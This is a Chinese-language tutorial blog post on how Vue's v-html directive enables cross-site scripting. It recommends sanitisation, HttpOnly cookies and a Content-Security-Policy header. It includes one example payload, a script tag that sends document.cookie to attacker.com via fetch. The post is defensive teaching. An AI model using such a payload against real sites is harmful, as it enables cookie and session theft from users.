---
title: XSS Attack
date: 2025-04-12 23:58:57
categories:
 - 计算机网络
tags:
 - 计算机网络
 - 网络安全
---

## 1. 什么是 XSS

正常情况下，Vue 把数据当作纯文本显示:

```vue
<div>{{ content }}</div>
```

如果 `content` 是 `<b>加粗</b>`，页面会直接显示 `<b>加粗</b>`（文本，不会变粗）

但用 `v-html`，Vue 会把内容当作 HTML 代码 解析：

```html
<div v-html="content"></div>
```

同样的 `<b>加粗</b>`，页面会显示 加粗（实际渲染成粗体）

通俗说：`v-html` 就像告诉浏览器，“别把这串东西当文字，照着 HTML 的规则去执行，显示出效果”

**为什么要用 v-html？**

开发者用 `v-html` 是因为他们想让用户输入的 富文本（带格式的内容，比如加粗、斜体、链接）正确显示

- 显示用户格式化内容：比如，论坛或博客允许用户写文章，支持加粗 `<b>`、斜体 `<i>`、链接`<a>`
- 动态内容：网站从后端拿到 HTML 片段（比如广告代码、编辑器生成的 HTML），需要直接渲染

假设你想让用户在评论里用 `<b>加粗</b>`，显示成粗体

```vue
<div v-for="comment in comments" :key="comment.id" v-html="comment.content"></div>
```

用户输入 `<b>好棒<b>`，页面显示 **好棒**（粗体）

**为什么 `v-html` 导致 XSS 风险？**

虽然 `v-html` 很方便，但它有个大问题：它会把内容当作代码执行，包括危险的 JavaScript, `v-html` 不挑内容，任何 HTML 都照跑

在我们之前的代码中：

```vue
<div v-for="comment in comments" :key="comment.id" v-html="comment.content"></div>
```

用户在评论框输入：

```vue
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```

后端（C#）保存到数据库，前端用 `v-html` 渲染, 浏览器看到 `<script>`，直接运行，偷走用户的 Cookie

**为什么不用 `v-html`就没事？**

Vue 默认的 `{{ content }}` 或 `v-text` 把内容当纯文本，不会执行 HTML 或 JavaScript

输入 `<script>alert('坏蛋')</script>`： `{{ content }}`：显示 `<script>alert('坏蛋')</script>`（文字）

恶意代码变成普通文字，XSS 没了

**那什么时候用 v-html 才安全？**

- 前端清理用户输入: 用库（如 `sanitize-html`）移除危险标签（`<script>`、`<iframe>`）
- 后端也清理: C# 后端用 `HtmlSanitizer` 过滤`comment.Content = sanitizer.Sanitize(comment.Content);`

## 2. 总结

**啥是 v-html？** Vue 的一个功能，让 HTML 代码（比如 <b>加粗</b>）变成页面效果（粗体），而不是干显示文字

**为啥用？** 想让用户加粗、加链接，页面好看点（比如评论支持格式）

**为啥危险？** 用户塞 `<script>`，浏览器照跑，偷 Cookie、搞乱子、骗密码

**咋安全？**

- 不用 `v-html`，用 `{{ }}` 显示文字
- 真要用，清理输入（`sanitize-html` 或后端 `HtmlSanitizer`）
- 锁 Cookie（HttpOnly），限脚本（CSP）

**所有网站都这样？** 不，安全网站会清理输入，现代框架默认防 XSS，只有不小心的开发者才中招

> **锁 Cookie（HttpOnly）**
>
> 正常情况下，JavaScript（比如 `<script>document.cookie</script>`）可以读 Cookie，攻击者通过 XSS 注入脚本就能偷
>
> 设了 HttpOnly, `document.cookie` 就拿不到这个 Cookie
>
> **限脚本（CSP）**
>
> CSP（Content Security Policy，内容安全策略） 是网站告诉浏览器的一条规则：“只允许跑我信任的脚本，其他的都禁！”
>
> ```c#
> // Program.cs
> app.Use(async (context, next) =>
> {
>     context.Response.Headers.Add("Content-Security-Policy", 
>         "default-src 'self'; script-src 'self'; connect-src 'self'");
>     await next();
> });
> ```
>
> - 确保你的 Vue 代码不依赖外部脚本（比如 CDN），全用本地资源，符合 CSP 规则

